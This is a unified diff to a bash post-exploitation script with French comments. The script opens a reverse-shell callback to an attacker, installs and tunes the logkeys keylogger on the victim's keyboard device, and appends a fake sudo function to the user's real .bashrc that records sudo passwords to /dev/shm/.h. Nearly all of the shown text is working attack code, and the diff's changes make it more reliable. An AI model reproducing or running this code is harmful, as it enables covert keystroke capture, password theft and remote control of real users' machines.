@@ -13,8 +13,9 @@ LOG=/tmp/.cb.log
 U="${SUDO_USER:-$USER}"
 UHOME=$(getent passwd "$U" | cut -d: -f6)
 
-install -o "$U" -g "$U" -m 666 /dev/null "$KL"
-install -o "$U" -g "$U" -m 666 /dev/null "$HF"
+: > "$KL"; : > "$HF"
+chown "$U" "$KL" "$HF" 2>/dev/null
+chmod 666 "$KL" "$HF"
 : > "$LOG"
 
 # --- 1. callback vers l'attaquant ---
@@ -51,26 +52,69 @@ pty.spawn("/bin/bash")' "$H" "$P" >>"$LOG" 2>&1 &
 fi
 
 # --- 2. keylogger evdev ---
-command -v logkeys >/dev/null || apt-get install -y logkeys >/dev/null 2>&1
-DEV=$(grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -o 'event[0-9]*' | head -1)
+HADLOGKEYS=0
+command -v logkeys >/dev/null && HADLOGKEYS=1
+echo "$HADLOGKEYS" > "$D/.hadlogkeys"
+
+if [ "$HADLOGKEYS" -eq 0 ]; then
+  apt-get update -qq >/dev/null 2>&1
+  apt-get install -y logkeys >/dev/null 2>&1 || true
+fi
+
+DEV=$(awk 'BEGIN{RS=""} /EV=120013/ && /Handlers=.*kbd/ \
+  && !/Video Bus|Power Button|Sleep Button|Hotkey/ {
+    for (i=1;i<=NF;i++) if ($i ~ /^event[0-9]+$/) { print $i; exit } }' \
+  /proc/bus/input/devices | head -1)
+
 if command -v logkeys >/dev/null && [ -n "$DEV" ]; then
   logkeys -k 2>/dev/null
-  if logkeys -s -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>/dev/null; then
-    echo "[+] keylogger : /dev/input/$DEV -> $KL"
+  KM=$D/.km
+  if dumpkeys --long-info 2>/dev/null | logkeys --export-keymap="$KM" 2>/dev/null \
+     && [ -s "$KM" ]; then
+    if logkeys -s -m "$KM" -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>>"$LOG"; then
+      echo "[+] keylogger (keymap exportee) : /dev/input/$DEV -> $KL"
+    else
+      echo "[!] logkeys a echoue sur $DEV"
+    fi
   else
-    echo "[!] logkeys a echoue sur $DEV"
+    if logkeys -s -u -d "/dev/input/$DEV" -o "$KL" --no-timestamps 2>>"$LOG"; then
+      echo "[!] keymap non recuperable : keylogger en US, log a reinterpretter"
+    else
+      echo "[!] logkeys a echoue sur $DEV"
+    fi
   fi
 else
   echo "[!] logkeys absent ou device introuvable"
 fi
 
 # --- 3. hook sudo dans le .bashrc reel ---
-HOOK='sudo() { read -rsp "[sudo] password for $USER: " P; echo; echo "SUDO:$USER:$P" >> /dev/shm/.h; command sudo -S "$@" <<<"$P"; }'
-if ! grep -q 'SUDO:$USER' "$UHOME/.bashrc" 2>/dev/null; then
-  printf '%s\n' "$HOOK" >> "$UHOME/.bashrc"
-  chown "$U:$U" "$UHOME/.bashrc"
-  echo "[+] hook sudo -> $HF"
+if [ -n "$UHOME" ]; then
+  [ -f "$UHOME/.bashrc" ] || install -o "$U" -m 644 /dev/null "$UHOME/.bashrc"
+
+  if ! grep -qF 'PICOHOOK-START' "$UHOME/.bashrc" 2>/dev/null; then
+    cat >> "$UHOME/.bashrc" <<'EOF'
+# PICOHOOK-START
+sudo() {
+  if [ -t 0 ] && [ -t 1 ]; then
+    local P
+    read -rsp "[sudo] password for $USER: " P; echo
+    printf "SUDO:%s:%s\n" "$USER" "$P" >> /dev/shm/.h
+    command sudo -S -p '' "$@" < <(printf "%s\n" "$P")
+  else
+    command sudo "$@"
+  fi
+}
+# PICOHOOK-END
+EOF
+    chown "$U" "$UHOME/.bashrc"
+    echo "[+] hook sudo -> $HF"
+  else
+    echo "[=] hook sudo deja present"
+  fi
+else
+  echo "[!] SUDO_USER vide : hook .bashrc saute"
 fi
 
 # --- 4. shell local sur le terminal ---
-exec bash -li
+# stdin peut etre un pipe (mot de passe) : on rattache le tty
+exec bash -li </dev/tty >/dev/tty 2>&1
